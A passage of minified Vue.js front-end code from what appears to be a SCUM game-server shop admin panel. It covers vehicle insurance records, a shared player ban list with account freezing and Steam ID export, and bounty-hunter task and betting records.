e.deleteVehicleEnsuranceItem(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete",loading:e.deleteLoading}},[e._v("删除")])],1):e._e()],1),[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("保单信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("险种:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.ensuranceConfig?t.ensuranceConfig.name:" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("反悔期(自定义文案):")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.ensuranceConfig?t.ensuranceConfig.activeMinutes+"分钟("+t.ensuranceConfig.activeMinutesDescription+")":" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("保险时效(自定义文案):")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.ensuranceConfig?t.ensuranceConfig.expireMinutes+"分钟("+t.ensuranceConfig.expireMinutesDescription+")":" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("保单售价:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.ensuranceConfig?"$"+t.ensuranceConfig.price:" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("出险理赔额:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.ensuranceConfig?"$"+t.ensuranceConfig.benifit:" - "))])]),null!==t.vehicleId?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("被保险载具ID:")]),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.vehicleId))])]):e._e()]]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.vehicleEnsuranceListPagination.pageSize,current:e.vehicleEnsuranceListPagination.pageNum,total:e.vehicleEnsuranceListPagination.total},on:{change:e.onChangeVehicleEnsuranceListPagination,showSizeChange:e.onShowSizeChangeVehicleEnsuranceListPagination}})],1)])],1)}),[],!1,null,"6e0411b4",null).exports,ca={name:"ScumBan",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),components:{Liker:V,Editor:j},data:function(){return{moment:R.a,showBanScumBanSteamIdModal:!1,editBanScumBanSteamIdLimit:3,editBanScumBanSteamIdLoading:!1,showEditScumBanModal:!1,editScumBanLoading:!1,editScumBanForm:{type:"new",steamId:"",reason:""},editScumBanRules:{steamId:[{required:!0,trigger:"change",message:"请输入17位Steam ID",validator:function(e,t,i){t&&17===t.length&&/[0-9]{17}/.test(t)?i():i(new Error("请输入17位Steam ID"))}}],reason:[{required:!0,trigger:"change",message:"请输入原因",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入原因"))}}]},loadingScumBanListTable:!1,scumBanListFilter:{onlySelfServer:!1,steamId:void 0,timestampStart:void 0,timestampEnd:void 0},scumBanListColumns:[{title:"提交服务器",key:"reportSource",dataIndex:"reportSource",width:120,align:"center",scopedSlots:{customRender:"reportSource"}},{title:"Steam ID",key:"steamId",dataIndex:"steamId",width:180,align:"center",scopedSlots:{customRender:"steamId"}},{title:"商城用户名",key:"userName",dataIndex:"userName",width:180,align:"center",scopedSlots:{customRender:"userName"}},{title:"SCUM服务器ID",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"提交时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],scumBanListData:[],scumBanListPagination:{pageSize:20,pageNum:1,total:0},expandedScumBanIds:[]}},mounted:function(){var e=this;this.$route.query.steamId&&this.openEditScumBanModal("new",this.$route.query.steamId),this.$nextTick((function(){e.getScumBanList(void 0)}))},methods:{openEditScumBanModal:function(e,t,i){this.$set(this,"editScumBanForm",{type:e,steamId:t||"",reason:i&&i.reason?i.reason:""}),this.showEditScumBanModal=!0},onScumBanListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/scum-ban"}),this.scumBanListPagination.pageNum=1,this.$nextTick((function(){e.getScumBanList(!0)}))},onScumBanListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/scum-ban"}),this.scumBanListPagination.pageNum=1,this.$nextTick((function(){e.getScumBanList()}))},onChangeScumBanListPagination:function(e){var t=this;this.scumBanListPagination.pageNum=e,this.$nextTick((function(){t.getScumBanList()}))},onShowSizeChangeScumBanListPagination:function(e,t){var i=this;this.scumBanListPagination.pageNum=1,this.scumBanListPagination.pageSize=t,this.$nextTick((function(){i.getScumBanList()}))},getScumBanList:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d,u;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=i.scumBanListPagination,r=n.pageNum,o=n.pageSize,e?(i.scumBanListFilter={onlySelfServer:!1,steamId:void 0,timestampStart:void 0,timestampEnd:void 0},l={pageNum:r,pageSize:o}):((c=Object(A.cloneDeep)(i.scumBanListFilter)).steamId=c.steamId&&c.steamId.length?c.steamId:void 0,void 0!==c.timestampStart&&void 0!==c.timestampEnd&&(c.timestampStart=R()(c.timestampStart).valueOf(),c.timestampEnd=R()(c.timestampEnd).valueOf()),l=Object(s.a)({pageNum:r,pageSize:o},c)),i.loadingScumBanListTable=!0,a.prev=3,d=!0===i.scumBanListFilter.onlySelfServer?"/scumBan/listScumBanByServer":"/scumBan/listAllScumBan",a.next=7,f({method:"GET",url:d,params:l});case 7:u=a.sent,i.loadingScumBanListTable=!1,200===u.status&&(i.scumBanListPagination.total=u.data.count,i.scumBanListData=u.data.list,i.$nextTick((function(){if(void 0!==t){var e=u.data.list.find((function(e){return e.id===t}));i.$set(i,"expandedScumBanIds",[e.id])}else i.$set(i,"expandedScumBanIds",[])}))),a.next=16;break;case 12:a.prev=12,a.t0=a.catch(3),console.error(a.t0),i.loadingScumBanListTable=!1;case 16:case"end":return a.stop()}}),a,null,[[3,12]])})))()},deleteScumBan:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,i.next=3,f({method:"DELETE",url:"/scumBan/deleteScumBan",params:{steamId:e.steamId}});case 3:200===i.sent.status&&(t.$message.success("已撤销"),t.getScumBanList()),i.next=12;break;case 7:i.prev=7,i.t0=i.catch(0),console.error(i.t0),t.$message.error(i.t0.toString()),t.loadingScumBanListTable=!1;case 12:case"end":return i.stop()}}),i,null,[[0,7]])})))()},onClickSubmitScumBan:function(){var e=this;this.$refs.editScumBanForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=18;break}return t.prev=1,e.editScumBanLoading=!0,a=Object(A.cloneDeep)(e.editScumBanForm),n="new"===a.type?"POST":"PUT",r="new"===a.type?"/scumBan/addScumBan":"/scumBan/updateScumBan",t.next=8,f({method:n,url:r,data:{steamId:a.steamId,reason:a.reason}});case 8:o=t.sent,e.editScumBanLoading=!1,200===o.status&&(e.$message.success("new"===a.type?"已提交，若之前提交过则不会覆盖":"已更新"),e.$set(e,"editScumBanForm",{type:"new",steamId:"",reason:""}),e.showEditScumBanModal=!1,e.getScumBanList()),t.next=18;break;case 13:t.prev=13,t.t0=t.catch(1),console.error(t.t0),e.$message.error(t.t0.toString()),e.editScumBanLoading=!1;case 18:case"end":return t.stop()}}),t,null,[[1,13]])})));return function(e){return t.apply(this,arguments)}}())},onClickSubmitBanScumBanSteamId:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!("number"==typeof e.editBanScumBanSteamIdLimit&&e.editBanScumBanSteamIdLimit>0)){t.next=17;break}return t.prev=1,e.editBanScumBanSteamIdLoading=!0,t.next=5,f({method:"POST",url:"/scumBan/batchBanScumBanSteamId",data:{limit:e.editBanScumBanSteamIdLimit}});case 5:i=t.sent,e.editBanScumBanSteamIdLoading=!1,200===i.status&&(e.$message.success(i.msg),e.editBanScumBanSteamIdLimit=3,e.showBanScumBanSteamIdModal=!1),t.next=15;break;case 10:t.prev=10,t.t0=t.catch(1),console.error(t.t0),e.$message.error(t.t0.toString()),e.editBanScumBanSteamIdLoading=!1;case 15:t.next=18;break;case 17:e.$message.warn("请输入大于等于1的整数");case 18:case"end":return t.stop()}}),t,null,[[1,10]])})))()},onClickExportAllScumBanSteamId:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/scumBan/exportAllScumBanSteamId"});case 3:200===(i=t.sent).status&&(a=i.data.join("\r"),(n=document.createElement("a")).setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(a)),n.setAttribute("download","违规联办名单(请自行粘贴到服务器管理后台).log"),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),e.$message.success("导出成功")),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),e.$message.error("下载出错："+t.t0.toString());case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},da=Object(S.a)(ca,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"商城联办"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"upload",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),function(){return e.openEditScumBanModal("new")}.apply(null,arguments)}}},[e._v("提交举报联办")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"stop",type:"danger",size:"small"},nativeOn:{click:function(t){t.stopPropagation(),e.showBanScumBanSteamIdModal=!0}}},[e._v("冻结违规玩家商城账户")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"download",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onClickExportAllScumBanSteamId.apply(null,arguments)}}},[e._v("导出所有违规Steam ID")])],1):e._e()]),i("a-modal",{attrs:{title:("new"===e.editScumBanForm.type?"提交":"更新")+"举报联办信息","mask-closable":!1,width:800},on:{cancel:function(){e.editScumBanForm.change=0,e.editScumBanForm.reason=""}},model:{value:e.showEditScumBanModal,callback:function(t){e.showEditScumBanModal=t},expression:"showEditScumBanModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.editScumBanLoading},on:{click:e.onClickSubmitScumBan}},[e._v("提交")])],1),e.showEditScumBanModal?i("a-form-model",{ref:"editScumBanForm",attrs:{model:e.editScumBanForm,rules:e.editScumBanRules,"label-col":{span:4},"wrapper-col":{span:20}}},[i("a-form-model-item",{attrs:{label:"Steam ID",prop:"steamId"}},[i("a-input",{attrs:{disabled:"new"!==e.editScumBanForm.type},model:{value:e.editScumBanForm.steamId,callback:function(t){e.$set(e.editScumBanForm,"steamId",t)},expression:"editScumBanForm.steamId"}})],1),i("a-form-model-item",{attrs:{label:"举报原因",prop:"reason"}},[i("editor",{model:{value:e.editScumBanForm.reason,callback:function(t){e.$set(e.editScumBanForm,"reason",t)},expression:"editScumBanForm.reason"}})],1)],1):e._e()],2),i("a-modal",{attrs:{title:"冻结违规玩家商城账户","mask-closable":!1,width:500},on:{cancel:function(t){e.editBanScumBanSteamIdLimit=3}},model:{value:e.showBanScumBanSteamIdModal,callback:function(t){e.showBanScumBanSteamIdModal=t},expression:"showBanScumBanSteamIdModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.editBanScumBanSteamIdLoading},on:{click:e.onClickSubmitBanScumBanSteamId}},[e._v("提交")])],1),i("span",[e._v("冻结被举报次数 ≥")]),i("a-input-number",{staticStyle:{margin:"0 5px"},attrs:{precision:0,min:1},model:{value:e.editBanScumBanSteamIdLimit,callback:function(t){e.editBanScumBanSteamIdLimit=t},expression:"editBanScumBanSteamIdLimit"}}),i("span",[e._v("的商城账户")])],2),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onScumBanListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onScumBanListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"精确匹配",allowClear:""},model:{value:e.scumBanListFilter.steamId,callback:function(t){e.$set(e.scumBanListFilter,"steamId",t)},expression:"scumBanListFilter.steamId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("购买时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.scumBanListFilter.timestampStart,e.scumBanListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.scumBanListFilter,"timestampStart",t[0]),e.$set(e.scumBanListFilter,"timestampEnd",t[1])}}}),i("div",{staticStyle:{width:"130px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("只显示本服提交的:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.scumBanListFilter.onlySelfServer,callback:function(t){e.$set(e.scumBanListFilter,"onlySelfServer",t)},expression:"scumBanListFilter.onlySelfServer"}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.scumBanListColumns,"data-source":e.scumBanListData,expandedRowKeys:e.expandedScumBanIds,"row-key":"id",pagination:!1,loading:e.loadingScumBanListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedScumBanIds.find((function(e){return e===i.id}))&&e.expandedScumBanIds.push(i.id);else{var a=Object.keys(e.expandedScumBanIds).find((function(t){return e.expandedScumBanIds[t]===i.id}));void 0!==a&&e.expandedScumBanIds.splice(a,1)}}},scopedSlots:e._u([{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0",height:"500px","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("提交证据说明")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("editor",{attrs:{disabled:!0},model:{value:t.reason,callback:function(i){e.$set(t,"reason",i)},expression:"record.reason"}}),i("div",{staticStyle:{width:"100%",height:"24px","margin-top":"10px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("可信度评价")]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("Liker",{attrs:{"scum-ban-id":t.id,"like-count":t.scumBanRemark?t.scumBanRemark.filter((function(e){return 0===e.remark})).length:0,"dislike-count":t.scumBanRemark?t.scumBanRemark.filter((function(e){return 1===e.remark})).length:0,"self-remark":t.selfRemark},on:{refresh:function(){return e.getScumBanList(void 0,t.id)}}})],1)],1)}},{key:"reportSource",fn:function(t,a){return[!0===a.selfReport?i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t))]):i("span",[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"controls",fn:function(t,a){return[e.userInfo&&"sysAdmin"===e.userInfo.role&&!0===a.selfReport?i("a-popconfirm",{attrs:{placement:"right",title:"确定要撤销该举报吗"},on:{confirm:function(){return e.deleteScumBan(a)}}},[i("a-button",{attrs:{size:"small",icon:"edit"},nativeOn:{click:function(t){return t.stopPropagation(),function(){return e.openEditScumBanModal("edit",a.steamId,a)}.apply(null,arguments)}}},[e._v("编辑")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"rollback"}},[e._v("撤销")])],1):i("span",[e._v("暂无可用操作")])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.scumBanListPagination.pageSize,current:e.scumBanListPagination.pageNum,total:e.scumBanListPagination.total},on:{change:e.onChangeScumBanListPagination,showSizeChange:e.onShowSizeChangeScumBanListPagination}})],1)])],1)}),[],!1,null,"0eb023a7",null).exports,ua={name:"BountyHunterTableExpand",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),props:{bountyHunterId:{type:String,default:null}},data:function(){return{moment:R.a,bountyHunterTaskStatusEnum:{processing:"进行中",success:"成功",failed:"失败"},bountyHunterTaskStatusBadgeKeyValue:{processing:"processing",success:"success",failed:"error"},currentExpandKey:null,currentExpandedBountyHunterId:"",currentBountyHunterTask:{loading:!1,columns:[{title:"接单猎人",key:"hunterUser",dataIndex:"hunterUser",width:200,align:"center",scopedSlots:{customRender:"hunterUser"}},{title:"保证金",key:"securityDeposit",dataIndex:"securityDeposit",width:120,align:"center",scopedSlots:{customRender:"securityDeposit"}},{title:"任务状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:200,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"操作",key:"controls",dataIndex:"controls",width:120,align:"center",scopedSlots:{customRender:"controls"}}],bountyHunterTaskList:[],bountyHunterTaskListPagination:{pageNum:1,pageSize:10,total:0}},currentBountyHunterGambling:{loading:!1,columns:[{title:"打赌人",key:"hunterUser",dataIndex:"hunterUser",width:200,align:"center",scopedSlots:{customRender:"hunterUser"}},{title:"目标猎人",key:"betHunterUser",dataIndex:"betHunterUser",width:200,align:"center",scopedSlots:{customRender:"betHunterUser"}},{title:"打赌金额",key:"betAmount",dataIndex:"betAmount",width:120,align:"center",scopedSlots:{customRender:"betAmount"}},{title:"开奖结果",key:"status",dataIndex:"status",width:120,align:"center",scopedSlots:{customRender:"status"}},{title:"下注时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],bountyHunterGamblingList:[],bountyHunterGamblingListPagination:{pageNum:1,pageSize:10,total:0}}}},watch:{bountyHunterId:{immediate:!0,handler:function(e){var t=this;this.currentExpandedBountyHunterId=e,e&&this.$nextTick((function(){t.loadAll()}))}}},methods:{loadAll:function(){this.reloadBountyHunterTaskList(),this.reloadBountyHunterGamblingList()},onChangeBountyHunterTaskListPagination:function(e){var t=this;this.currentBountyHunterTask.bountyHunterTaskListPagination.pageNum=e,this.$nextTick((function(){t.reloadBountyHunterTaskList()}))},onShowSizeChangeBountyHunterTaskListPagination:function(e,t){var i=this;this.currentBountyHunterTask.bountyHunterTaskListPagination.pageNum=1,this.currentBountyHunterTask.bountyHunterTaskListPagination.pageSize=t,this.$nextTick((function(){i.reloadBountyHunterTaskList()}))},reloadBountyHunterTaskList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.$set(e.currentBountyHunterTask,"loading",!0),t.prev=1,i=e.currentBountyHunterTask.bountyHunterTaskListPagination,a=i.pageNum,n=i.pageSize,r={id:e.currentExpandedBountyHunterId,pageNum:a,pageSize:n},t.next=6,f({method:"GET",url:"/bountyHunterAdminSys/listTask",params:r});case 6:o=t.sent,e.$set(e.currentBountyHunterTask,"loading",!1),200===o.status&&(e.currentBountyHunterTask.bountyHunterTaskListPagination.total=o.data.count,e.currentBountyHunterTask.bountyHunterTaskList=o.data.list),t.next=16;break;case 11:t.prev=11,t.t0=t.catch(1),console.error(t.t0),e.$message.error(t.t0.toString()),e.$set(e.currentBountyHunterTask,"loading",!1);case 16:case"end":return t.stop()}}),t,null,[[1,11]])})))()},failBountyHunterTask:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,a={userId:e.hunterUserId,taskId:e.id},i.next=4,f({method:"POST",url:"/bountyHunterAdminSys/exitTask",data:a});case 4:200===i.sent.status&&(t.$message.success("修改成功"),t.reloadBountyHunterTaskList()),i.next=12;break;case 8:i.prev=8,i.t0=i.catch(0),console.error(i.t0),t.$message.error(i.t0.toString());case 12:case"end":return i.stop()}}),i,null,[[0,8]])})))()},onChangeBountyHunterGamblingListPagination:function(e){var t=this;this.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageNum=e,this.$nextTick((function(){t.reloadBountyHunterGamblingList()}))},onShowSizeChangeBountyHunterGamblingListPagination:function(e,t){var i=this;this.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageNum=1,this.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageSize=t,this.$nextTick((function(){i.reloadBountyHunterGamblingList()}))},clearAndReloadBountyHunterGamblingList:function(){var e=this;this.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageNum=1,this.currentBountyHunterGambling.bountyHunterGamblingListPagination.pageSize=10,this.$nextTick((function(){e.reloadBountyHunterGamblingList()}))},reloadBountyHunterGamblingList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.currentBountyHunterGambling.bountyHunterGamblingListPagination,a=i.pageNum,n=i.pageSize,r={id:e.currentExpandedBountyHunterId,pageNum:a,pageSize:n},e.currentBountyHunterGambling.loading=!0,t.prev=3,t.next=6,f({method:"GET",url:"/bountyHunterAdminSys/listGambling",params:r});case 6:o=t.sent,e.currentBountyHunterGambling.loading=!1,200===o.status&&(e.currentBountyHunterGambling.bountyHunterGamblingListPagination.total=o.data.count,e.currentBountyHunterGambling.bountyHunterGamblingList=o.data.list),t.next=16;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.$message.error(t.t0.toString()),e.currentBountyHunterGambling.loading=!1;case 16:case"end":return t.stop()}}),t,null,[[3,11]])})))()}}},pa={name:"BountyHunter",components:{BountyHunterTableExpand:Object(S.a)(ua,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("a-collapse",{model:{value:e.currentExpandKey,callback:function(t){e.currentExpandKey=t},expression:"currentExpandKey"}},[i("a-collapse-panel",{key:"bounty-hunter-task"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("猎人接单历史")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"bounty-hunter-task"===e}))?[!1===e.currentBountyHunterTask.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.reloadBountyHunterTaskList.apply(null,arguments)}}},[e._v("刷新")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"bounty-hunter-task"===e}))?i("div",{staticStyle:{width:"100%",height:"410px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"800px"},attrs:{columns:e.currentBountyHunterTask.columns,"data-source":e.currentBountyHunterTask.bountyHunterTaskList,"row-key":"id",pagination:!1,loading:e.currentBountyHunterTask.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"hunterUser",fn:function(t,a){return[a.hunterUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.hunterUser.userName}})}}},[e._v(e._s(a.hunterUser?a.hunterUser.userName:a.bountyHunterId))])]:e._e()]}},{key:"securityDeposit",fn:function(t){return[i("span",[e._v(e._s(t)+"美金")])]}},{key:"status",fn:function(t){return[e.bountyHunterTaskStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.bountyHunterTaskStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.bountyHunterTaskStatusEnum[t]))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss")))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||"failed"===a.status?i("span",[e._v("暂无可用操作")]):i("a-popconfirm",{attrs:{placement:"right",title:"确定要标记该猎人任务失败吗"},on:{confirm:function(){return e.failBountyHunterTask(a)}}},[i("a-button",{attrs:{type:"danger",size:"small",icon:"close"}},[e._v("标记为失败")])],1)]}}],null,!1,917713873)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentBountyHunterTask.bountyHunterTaskListPagination.pageSize,current:e.currentBountyHunterTask.bountyHunterTaskListPagination.pageNum,total:e.currentBountyHunterTask.bountyHunterTaskListPagination.total},on:{change:e.onChangeBountyHunterTaskListPagination,showSizeChange:e.onShowSizeChangeBountyHunterTaskListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentBountyHunterTask.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"bounty-hunter-gambling"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("玩家打赌记录")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"bounty-hunter-gambling"===e}))?[!1===e.currentBountyHunterGambling.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.clearAndReloadBountyHunterGamblingList.apply(null,arguments)}}},[e._v("刷新")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"bounty-hunter-gambling"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-alert",{attrs:{"show-icon":"",type:"warning",message:"免责声明"}},[i("div",{attrs:{slot:"description"},slot:"description"},[e._v("本商城平台受中华人民共和国和日本国法律管制与保护。各位玩家/服务器使用赏金猎人功能请遵守 "),i("strong",{staticStyle:{color:"red"}},[e._v("所在国、中华人民共和国和日本国")]),e._v(" 的法律，本商城不提供任何涉赌功能，不对用户的行为承担任何的法律责任，但会记录用户的使用行为，如果收到关于用户/服务器在法律上不正利用商城的举报，将会暂停商城服务。请各位用户自行遵守所在国法律，一旦发生罪案，商城平台方会向各国当局提供证据。")])]),i("a-table",{staticStyle:{"max-width":"850px","margin-top":"15px"},attrs:{scroll:{y:410},columns:e.currentBountyHunterGambling.columns,"data-source":e.currentBountyHunterGambling.bountyHunterGamblingList,"row-key":"id",pagination:!1,loading:e.currentBountyHunterGambling.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"hunterUser",fn:function(t,a){return[a.hunterUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.hunterUser.userName}})}}},[e._v(e._s(a.hunterUser?a.hunterUser.userName:"-"))])]:e._e()]}},{key:"betHunterUser",fn:function(t,a){return[a.betHunterUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return 